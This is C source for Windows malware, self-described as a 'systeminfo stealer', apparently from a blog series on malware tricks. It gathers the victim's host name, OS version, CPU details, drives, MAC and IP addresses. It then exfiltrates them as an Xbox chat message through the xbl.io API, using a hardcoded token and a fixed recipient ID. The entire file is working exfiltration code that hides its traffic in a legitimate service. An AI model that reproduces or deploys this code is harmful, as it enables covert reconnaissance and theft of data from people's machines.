/*
 * hack.c
 * systeminfo stealer
 * via Xbox friend chat using xbl.io API
 * author @cocomelonc
 * https://cocomelonc.github.io/malware/2025/10/23/malware-trick-53.html
*/

#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <stdio.h>

#define XBOX_TOKEN "598296f2-1cf0-42e9-bdd4-d0c63db1d532"

// send data to Xbox chat via xbl.io API
int sendToXbox(const char* message) {
  HINTERNET hSession = WinHttpOpen(L"UserAgent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) return 1;
 
  HINTERNET hConnect = WinHttpConnect(hSession, L"xbl.io", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    WinHttpCloseHandle(hSession);
    return 1;
  }
 
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/v2/conversations", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return 1;
  }

  char authHeader[512];
  snprintf(authHeader, sizeof(authHeader), "X-Authorization: %s", XBOX_TOKEN);

  wchar_t wauthHeader[512];
  wchar_t wctypeHeader[] = L"Content-Type: application/json";
  MultiByteToWideChar(CP_ACP, 0, authHeader, -1, wauthHeader, 512);
 
  WinHttpAddRequestHeaders(hRequest, wauthHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);
  WinHttpAddRequestHeaders(hRequest, wctypeHeader, -1, WINHTTP_ADDREQ_FLAG_ADD);

  char json_body[1024];
  snprintf(json_body, sizeof(json_body), 
    "{\"message\": \"%s\", \"xuid\": \"2535473210914202\"}",
    message);
  
  printf("%s\n", json_body);

  WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)json_body, strlen(json_body), strlen(json_body), 0);
 
  WinHttpReceiveResponse(hRequest, NULL);

  DWORD bytesRead;
  char buffer[2048];
  while (WinHttpReadData(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
    buffer[bytesRead] = '\0';
    printf("%s", buffer);
  }

  WinHttpCloseHandle(hRequest);
  WinHttpCloseHandle(hConnect);
  WinHttpCloseHandle(hSession);
  return 0;
}
 
int main() {
  char systemInfo[2048] = {0};
 
  CHAR hostName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD size = sizeof(hostName);
  GetComputerNameA(hostName, &size);
 
  OSVERSIONINFO osVersion;
  osVersion.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
  GetVersionEx(&osVersion);
 
  SYSTEM_INFO sysInfo;
  GetSystemInfo(&sysInfo);
 
  DWORD drives = GetLogicalDrives();
 
  IP_ADAPTER_INFO adapterInfo[16];
  DWORD adapterInfoSize = sizeof(adapterInfo);
  GetAdaptersInfo(adapterInfo, &adapterInfoSize);

  // snprintf(systemInfo, sizeof(systemInfo),
  //   "Host: %s , OS: %d.%d.%d",
  //   hostName,
  //   osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber);
 
  snprintf(systemInfo, sizeof(systemInfo),
    "Host: %s | OS: %d.%d.%d | Arch: %d | CPU: %d | Drives: %X ",
    hostName,
    osVersion.dwMajorVersion, osVersion.dwMinorVersion, osVersion.dwBuildNumber,
    sysInfo.wProcessorArchitecture,
    sysInfo.dwNumberOfProcessors,
    drives);
 
  for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter != NULL; adapter = adapter->Next) {
    snprintf(systemInfo + strlen(systemInfo), sizeof(systemInfo) - strlen(systemInfo),
     "MAC: %02X-%02X-%02X-%02X-%02X-%02X | IP: %s, ",
     adapter->Address[0], adapter->Address[1], adapter->Address[2],
     adapter->Address[3], adapter->Address[4], adapter->Address[5],
     adapter->IpAddressList.IpAddress.String);
  }

  sendToXbox(systemInfo);
  return 0;
}
